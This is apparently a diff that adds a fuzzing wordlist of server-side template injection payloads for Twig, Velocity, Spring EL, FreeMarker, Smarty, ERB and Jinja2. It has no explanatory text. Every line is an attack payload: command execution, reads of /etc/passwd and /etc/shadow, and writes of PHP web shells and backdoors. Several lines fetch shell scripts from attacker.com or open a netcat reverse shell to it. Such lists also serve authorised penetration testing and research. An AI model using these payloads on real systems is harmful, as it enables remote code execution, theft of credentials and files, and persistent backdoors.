@@ -1,0 +1,1000 @@
+{{7*7}}
+{{7*'7'}}
+{{_self}}
+{{app}}
+{{dump(app)}}
+{{_context}}
+{{dump(_context)}}
+{{'a'.toUpperCase()}}
+{{'a'|upper}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{['id']|reduce('system')}}
+{{['id']|sort('system')}}
+{{['id','']|sort('system')}}
+{{{'id':0}|map('system')}}
+{{'id'|filter('exec')}}
+{{'id'|map('exec')}}
+{{'id'|filter('passthru')}}
+{{'id'|map('passthru')}}
+{{'id'|filter('shell_exec')}}
+{{'id'|map('shell_exec')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['cat /etc/passwd']|map('system')}}
+{{['whoami']|filter('system')}}
+{{['ls -la']|map('system')}}
+{{['uname -a']|filter('system')}}
+{{['env']|map('system')}}
+{{['pwd']|filter('system')}}
+{{_self.env}}
+{{_self.env.getExtensions()}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}
+{{_self.env.registerUndefinedFilterCallback('popen')}}
+{{_self.env.setCache("/var/www/html")}}
+{{_self.env.enableDebug()}}
+{{_self.env.enableAutoReload()}}
+{{_self.env.disableStrictVariables()}}
+{{_self.env.getCache()}}
+{{_self.env.getTags()}}
+{{_self.env.getFilters()}}
+{{_self.env.getFunctions()}}
+{{_self.env.getTests()}}
+{{_self.env.getGlobals()}}
+{{_self.env.getLoader()}}
+{{_self.env.getCharset()}}
+{{_self.env.isDebug()}}
+{{_self.env.isAutoReload()}}
+{{_self.env.isStrictVariables()}}
+{{app.request}}
+{{app.request.server}}
+{{app.request.server.all}}
+{{app.request.query}}
+{{app.request.query.all}}
+{{app.request.request}}
+{{app.request.cookies}}
+{{app.request.files}}
+{{app.request.server.get('APP_SECRET')}}
+{{app.request.server.get('DATABASE_URL')}}
+{{app.request.server.get('SECRET_KEY')}}
+{{app.session}}
+{{app.user}}
+{{app.environment}}
+{{app.debug}}
+{{'<?php system($_GET[cmd]); ?>'|file_put_contents('shell.php')}}
+{{'<?php phpinfo(); ?>'|file_put_contents('info.php')}}
+{{'<?php eval($_POST[cmd]); ?>'|file_put_contents('backdoor.php')}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('phpinfo()')}}
+{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('phpinfo();')}}
+{{["id"]|sort("system")}}
+{{["id"]|merge|sort("system")}}
+{{{"<?php phpinfo();":1}|sort("system")}}
+{{{"<?php system($_GET[x]);":1}|sort("file_put_contents")}}
+{{"<?php system($_GET[x]);"|file_put_contents("shell.php")}}
+{{"<?php phpinfo();"|file_put_contents("info.php")}}
+{{"<?php eval($_POST[x]);"|file_put_contents("eval.php")}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('proc_open')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('popen')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('pcntl_exec')}}{{_self.env.getFilter('/bin/bash')}}
+{{_self.env.setCache('ftp://attacker.com:2121')}}
+{{_self.env.setCache('http://attacker.com/webshell.php')}}
+{{_self.env.loadTemplate("/etc/passwd")}}
+{{_self.env.compileSource("/etc/passwd")}}
+{{['id',0]|sort('system')}}
+{{['cat /etc/passwd',0]|sort('system')}}
+{{['whoami',0]|sort('system')}}
+{{['ls -la',0]|sort('system')}}
+{{['uname -a',0]|sort('system')}}
+{{['env',0]|sort('system')}}
+{{['pwd',0]|sort('system')}}
+{{['cat flag.txt',0]|sort('system')}}
+{{['ps aux',0]|sort('system')}}
+{{['ifconfig',0]|sort('system')}}
+{{['netstat -an',0]|sort('system')}}
+{{['cat /etc/shadow',0]|sort('system')}}
+{{'system'('id')}}
+{{'exec'('id')}}
+{{'passthru'('id')}}
+{{'shell_exec'('id')}}
+{{'popen'('id','r')}}
+{{'file_get_contents'('/etc/passwd')}}
+{{'file_put_contents'('shell.php','<?php system($_GET[x]);')}}
+{{'readfile'('/etc/passwd')}}
+{{'highlight_file'('/etc/passwd')}}
+{{'show_source'('/etc/passwd')}}
+{{_self.displayStart}}
+{{_self.blocks}}
+{{_self.macros}}
+{{_self.traits}}
+{{_self.parent}}
+{{_self.sourceContext}}
+{{_self.sourceName}}
+{{_self.sourcePath}}
+{{dump(_self)}}
+{{dump(app)}}
+{{dump(_context)}}
+{{dump(_self.env)}}
+{{['cat${IFS}/etc/passwd']|filter('system')}}
+{{['cat${IFS}/etc/passwd']|map('system')}}
+{{['cat</etc/passwd']|filter('system')}}
+{{['cat<flag.txt']|map('system')}}
+{{'cat /etc/passwd'|split(' ')|join('|')|map('system')}}
+{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('system("id")')}}
+{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('system("id");')}}
+{{_self.env.registerUndefinedFilterCallback('call_user_func')}}{{_self.env.getFilter('system","id')}}
+{{_self.env.registerUndefinedFilterCallback('call_user_func_array')}}{{_self.env.getFilter('system',array("id"))}}
+{{_self.env.registerUndefinedFilterCallback('array_map')}}{{_self.env.getFilter('system',array("id"))}}
+{{_self.env.registerUndefinedFilterCallback('array_filter')}}{{_self.env.getFilter('system',array("id"))}}
+{{_self.env.registerUndefinedFilterCallback('usort')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('uasort')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('uksort')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('array_reduce')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('array_walk')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('array_walk_recursive')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('iterator_apply')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('forward_static_call')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('forward_static_call_array')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('register_shutdown_function')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('register_tick_function')}}{{_self.env.getFilter('system')}}
+{{_self.env.getFunction('include')}}
+{{_self.env.getFunction('source')}}
+{{_self.env.getFunction('template_from_string')}}
+{{include('/etc/passwd')}}
+{{source('/etc/passwd')}}
+{{template_from_string("Hello #{7*7}")}}
+{{template_from_string("{{_self}}")}}
+{{max(array('system'),array('id'))}}
+{{min(array('system'),array('id'))}}
+{{sort(array('system','id'))}}
+#set($x=7*7)
+#set($x=7*'7')
+$class
+$class.inspect("java.lang.Runtime")
+$class.inspect("java.lang.System")
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("id"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("whoami"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cat /etc/passwd"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("ls -la"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("uname -a"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("pwd"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("env"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cat flag.txt"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("ps aux"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("ifconfig"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("netstat -an"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cat /etc/shadow"))
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("id"))
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("whoami"))
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("cat /etc/passwd"))
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("ls -la"))
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("uname -a"))
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($runtime=$str.forName("java.lang.Runtime"))
+#set($process=$runtime.getRuntime().exec("id"))
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($runtime=$str.forName("java.lang.Runtime"))
+#set($process=$runtime.getRuntime().exec("whoami"))
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($runtime=$str.forName("java.lang.Runtime"))
+#set($process=$runtime.getRuntime().exec("cat /etc/passwd"))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('id'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('whoami'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('cat /etc/passwd'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('ls -la'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($ex=$rt.getRuntime().exec('uname -a'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($ex=$rt.getRuntime().exec('pwd'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($ex=$rt.getRuntime().exec('env'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($ex=$rt.getRuntime().exec('cat flag.txt'))
+$class.inspect("java.lang.System").type.getProperty("user.name")
+$class.inspect("java.lang.System").type.getProperty("user.home")
+$class.inspect("java.lang.System").type.getProperty("user.dir")
+$class.inspect("java.lang.System").type.getProperty("os.name")
+$class.inspect("java.lang.System").type.getProperty("os.version")
+$class.inspect("java.lang.System").type.getProperty("os.arch")
+$class.inspect("java.lang.System").type.getProperty("java.version")
+$class.inspect("java.lang.System").type.getProperty("java.home")
+$class.inspect("java.lang.System").type.getProperty("java.class.path")
+$class.inspect("java.lang.System").type.getenv()
+$class.inspect("java.lang.System").type.getenv("PATH")
+$class.inspect("java.lang.System").type.getenv("HOME")
+$class.inspect("java.lang.System").type.getenv("USER")
+$class.inspect("java.lang.System").type.getenv("SHELL")
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["id"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["whoami"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["cat","/etc/passwd"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["ls","-la"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["uname","-a"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["bash","-c","id"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["sh","-c","id"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["/bin/sh","-c","id"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["/bin/bash","-c","id"])
+#set($process=$pb.newInstance($arr).start())
+#set($file=$class.inspect("java.io.File").type)
+#set($obj=$file.newInstance("/etc/passwd"))
+$obj.exists()
+#set($file=$class.inspect("java.io.File").type)
+#set($obj=$file.newInstance("/"))
+$obj.list()
+#set($file=$class.inspect("java.io.File").type)
+#set($obj=$file.newInstance("/"))
+$obj.listFiles()
+#set($file=$class.inspect("java.io.File").type)
+#set($obj=$file.newInstance("/etc/passwd"))
+$obj.canRead()
+#set($file=$class.inspect("java.io.File").type)
+#set($obj=$file.newInstance("."))
+$obj.list()
+#set($scanner=$class.inspect("java.util.Scanner").type)
+#set($file=$class.inspect("java.io.File").type)
+#set($fileObj=$file.newInstance("/etc/passwd"))
+#set($scannerObj=$scanner.newInstance($fileObj).useDelimiter("\\Z"))
+$scannerObj.next()
+#set($scanner=$class.inspect("java.util.Scanner").type)
+#set($file=$class.inspect("java.io.File").type)
+#set($fileObj=$file.newInstance("flag.txt"))
+#set($scannerObj=$scanner.newInstance($fileObj).useDelimiter("\\Z"))
+$scannerObj.next()
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("touch /tmp/pwned"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("wget http://attacker.com/shell.sh -O /tmp/shell.sh"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("curl http://attacker.com/shell.sh -o /tmp/shell.sh"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("nc attacker.com 4444 -e /bin/bash"))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($ex=$rt.getRuntime().exec('cat${IFS}/etc/passwd'))
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($ex=$rt.getRuntime().exec('cat$IFS/etc/passwd'))
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["sh","-c","cat</etc/passwd"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["sh","-c","cat<flag.txt"])
+#set($process=$pb.newInstance($arr).start())
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("calc"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cmd /c calc"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cmd /c dir"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("powershell.exe"))
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cmd.exe /c whoami"))
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["cmd","/c","whoami"])
+#set($process=$pb.newInstance($arr).start())
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
+#set($arr=["powershell","-c","whoami"])
+#set($process=$pb.newInstance($arr).start())
+#set($scanner=$class.inspect("java.util.Scanner").type)
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("id"))
+#set($input=$process.getInputStream())
+#set($scannerObj=$scanner.newInstance($input).useDelimiter("\\A"))
+$scannerObj.next()
+#set($scanner=$class.inspect("java.util.Scanner").type)
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("whoami"))
+#set($input=$process.getInputStream())
+#set($scannerObj=$scanner.newInstance($input).useDelimiter("\\Z"))
+$scannerObj.next()
+#set($scanner=$class.inspect("java.util.Scanner").type)
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("cat /etc/passwd"))
+#set($input=$process.getInputStream())
+#set($scannerObj=$scanner.newInstance($input).useDelimiter("\\Z"))
+$scannerObj.next()
+#set($inetAddress=$class.inspect("java.net.InetAddress").type)
+$inetAddress.getLocalHost()
+#set($inetAddress=$class.inspect("java.net.InetAddress").type)
+$inetAddress.getLocalHost().getHostName()
+#set($inetAddress=$class.inspect("java.net.InetAddress").type)
+$inetAddress.getLocalHost().getHostAddress()
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+$runtime.getRuntime().availableProcessors()
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+$runtime.getRuntime().freeMemory()
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+$runtime.getRuntime().totalMemory()
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+$runtime.getRuntime().maxMemory()
+#set($thread=$class.inspect("java.lang.Thread").type)
+$thread.currentThread()
+#set($thread=$class.inspect("java.lang.Thread").type)
+$thread.getAllStackTraces()
+#set($bufferedReader=$class.inspect("java.io.BufferedReader").type)
+#set($fileReader=$class.inspect("java.io.FileReader").type)
+#set($fr=$fileReader.newInstance("/etc/passwd"))
+#set($br=$bufferedReader.newInstance($fr))
+$br.readLine()
+#set($bufferedReader=$class.inspect("java.io.BufferedReader").type)
+#set($fileReader=$class.inspect("java.io.FileReader").type)
+#set($fr=$fileReader.newInstance("flag.txt"))
+#set($br=$bufferedReader.newInstance($fr))
+$br.readLine()
+#set($bufferedReader=$class.inspect("java.io.BufferedReader").type)
+#set($inputStreamReader=$class.inspect("java.io.InputStreamReader").type)
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("id"))
+#set($isr=$inputStreamReader.newInstance($process.getInputStream()))
+#set($br=$bufferedReader.newInstance($isr))
+$br.readLine()
+#set($bufferedReader=$class.inspect("java.io.BufferedReader").type)
+#set($inputStreamReader=$class.inspect("java.io.InputStreamReader").type)
+#set($runtime=$class.inspect("java.lang.Runtime").type)
+#set($process=$runtime.getRuntime().exec("whoami"))
+#set($isr=$inputStreamReader.newInstance($process.getInputStream()))
+#set($br=$bufferedReader.newInstance($isr))
+$br.readLine()
+#foreach($i in [1..$out.available()])$out.write($i)#end
+#set($x=$context.get('out'))
+#set($x=$context.get('request'))
+$velocityCount
+$velocityHasNext
+$request
+$response
+$session
+$application
+$context
+#include("/etc/passwd")
+#include("flag.txt")
+#parse("/etc/passwd")
+#parse("flag.txt")
+${7*7}
+${7*'7'}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('ls -la')}
+${T(java.lang.Runtime).getRuntime().exec('uname -a')}
+${T(java.lang.Runtime).getRuntime().exec('pwd')}
+${T(java.lang.Runtime).getRuntime().exec('env')}
+${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')}
+${T(java.lang.Runtime).getRuntime().exec('ps aux')}
+${T(java.lang.Runtime).getRuntime().exec('ifconfig')}
+${T(java.lang.Runtime).getRuntime().exec('netstat -an')}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','whoami'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat /etc/passwd'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'})}
+${T(java.lang.String).getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${T(java.lang.String).getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}
+${T(java.lang.System).getProperty('user.name')}
+${T(java.lang.System).getProperty('user.home')}
+${T(java.lang.System).getProperty('user.dir')}
+${T(java.lang.System).getProperty('os.name')}
+${T(java.lang.System).getProperty('os.version')}
+${T(java.lang.System).getProperty('os.arch')}
+${T(java.lang.System).getProperty('java.version')}
+${T(java.lang.System).getProperty('java.home')}
+${T(java.lang.System).getProperty('java.class.path')}
+${T(java.lang.System).getenv()}
+${T(java.lang.System).getenv('PATH')}
+${T(java.lang.System).getenv('HOME')}
+${T(java.lang.System).getenv('USER')}
+${T(java.lang.System).getenv('SHELL')}
+${T(java.lang.ProcessBuilder).start()}
+${new java.lang.ProcessBuilder('id').start()}
+${new java.lang.ProcessBuilder('whoami').start()}
+${new java.lang.ProcessBuilder('cat','/etc/passwd').start()}
+${new java.lang.ProcessBuilder('ls','-la').start()}
+${new java.lang.ProcessBuilder('uname','-a').start()}
+${new java.lang.ProcessBuilder('bash','-c','id').start()}
+${new java.lang.ProcessBuilder('sh','-c','id').start()}
+${new java.lang.ProcessBuilder('/bin/sh','-c','id').start()}
+${new java.lang.ProcessBuilder('/bin/bash','-c','id').start()}
+{php}echo getcwd();{/php}
+${"freemarker.template.utility.Execute"?new()("pwd")}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')}
+<%= File.read('flag.txt') %>
+{php}echo file_get_contents('flag.txt');{/php}
+${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
+{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('ps aux').read()}}
+${T(java.lang.Runtime).getRuntime().exec('ps aux')}
+<%= `ps aux` %>
+{php}system('ps aux');{/php}
+{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ifconfig")|attr("read")()}}
+${T(java.lang.Runtime).getRuntime().exec('ifconfig')}
+<%= `ifconfig` %>
+{php}system('ifconfig');{/php}
+{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('netstat -an',shell=True,stdout=-1).communicate()[0].strip()}}
+${T(java.lang.Runtime).getRuntime().exec('netstat -an')}
+<%= `netstat -an` %>
+{php}system('netstat -an');{/php}
+{{7*7}}{{7*'7'}}${{7*7}}${7*7}#{7*7}
+{{config}}{{self}}{{request}}{{app}}{{_self}}
+{{lipsum.__globals__}}${T(java.lang.System).getenv()}<%= ENV %>
+{%print(lipsum.__globals__)%}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+#set($pb=$class.inspect("java.lang.ProcessBuilder").type)#set($arr=["id"])#set($process=$pb.newInstance($arr).start())
+{{''.__class__.__base__.__subclasses__()}}
+${T(java.lang.Class).forName('java.lang.Runtime')}
+<%= ObjectSpace.each_object(Class).to_a %>
+{php}get_declared_classes();{/php}
+{{request.application.__globals__.__builtins__}}
+${T(java.lang.Runtime).getRuntime()}
+<%= Kernel.methods %>
+{$smarty.version}
+{{lipsum.__globals__['__builtins__']}}
+${@systemProperties}
+<%= defined?(Rails) %>
+{php}defined('SMARTY_VERSION');{/php}
+{{''.__class__.__mro__[1].__subclasses__()[40]}}
+${new java.io.File('/etc/passwd')}
+<%= File.new('/etc/passwd') %>
+{php}new SplFileObject('/etc/passwd');{/php}
+{{config.__class__}}
+${T(java.lang.String).getClass()}
+<%= self.class %>
+{php}get_class($this);{/php}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+{{request.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
+${{7*7}}[{7*7}]
+${{<%[7*7]%>}}
+${7*7}{{7*7}}<%= 7*7 %>{7*7}#set($x=7*7)
+{{}}${}<%=%>{}#
+{{config}}${_self}<%= self %>{$smarty}
+{{7*7}}${7*7}#set($x=49)
+{{''.__class__}}${T(java.lang.String)}<%= ''.class %>
+{{request.application}}${applicationScope}<%= defined?(Rails) %>
+{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt
+<%= `id` %>
+{php}system('id');{/php}
+{{lipsum.__globals__.os}}
+${T(java.lang.System)}
+<%= IO %>
+{$smarty.server}
+{{config.items()}}
+${@environment}
+<%= ENV.to_h %>
+{php}$_SERVER{/php}
+{{url_for.__globals__}}
+${{#request}}
+<%= request %>
+{{''.__class__.__mro__[2].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}
+<%= Open3.capture2('id') %>
+{php}exec('id',$output);print_r($output);{/php}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
+${T(java.lang.Runtime).getRuntime().exec('cat${IFS}/etc/passwd')}
+<%= `cat${IFS}/etc/passwd` %>
+{php}system('cat${IFS}/etc/passwd');{/php}
+{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
+${"freemarker.template.utility.Execute"?new()("cat$IFS/etc/passwd")}
+{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}
+<%= File.open('/etc/passwd').read %>
+{php}readfile('/etc/passwd');{/php}
+{{dict.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+${"freemarker.template.utility.Execute"?new()("calc")}
+#set($runtime=$class.inspect("java.lang.Runtime").type)#set($process=$runtime.getRuntime().exec("calc"))
+<%= `calc` rescue `open /Applications/Calculator.app` %>
+{php}system('calc');{/php}
+{{7*7}}{{7*'7'}}{{config}}{{self}}
+${{7*7}}${7*7}${_self}${app}
+<%= 7*7 %><%= '7'*7 %><%= self %>
+{7*7}{7*'7'}{$smarty}
+#set($x=7*7)$x
+{{request.application.__globals__.__builtins__.__import__('os')}}
+${T(java.lang.Runtime)}
+<%= require 'open3' %>
+{php}dl('suhosin.so');{/php}
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{g}}
+{{''.__class__}}
+{{[].__class__}}
+{{{}.__class__}}
+{{''.join}}
+{{config.items()}}
+{{self.__dict__}}
+{{request.environ}}
+{{request.application}}
+{{get_flashed_messages.__globals__}}
+{{lipsum.__globals__}}
+{{cycler.__init__.__globals__}}
+{{joiner.__init__.__globals__}}
+{{namespace.__init__.__globals__}}
+{{''.__class__.__mro__}}
+{{[].__class__.__mro__}}
+{{{}.__class__.__mro__}}
+{{''.__class__.__mro__[1]}}
+{{''.__class__.__mro__[2]}}
+{{[].__class__.__base__}}
+{{{}.__class__.__base__}}
+{{''.__class__.__base__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{{}.__class__.__base__.__subclasses__()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}},{%endfor%}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.__class__.__mro__[1].__subclasses__()}}
+{{request.__class__.__mro__[8].__subclasses__()}}
+{{request.__class__.__mro__[9].__subclasses__()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}
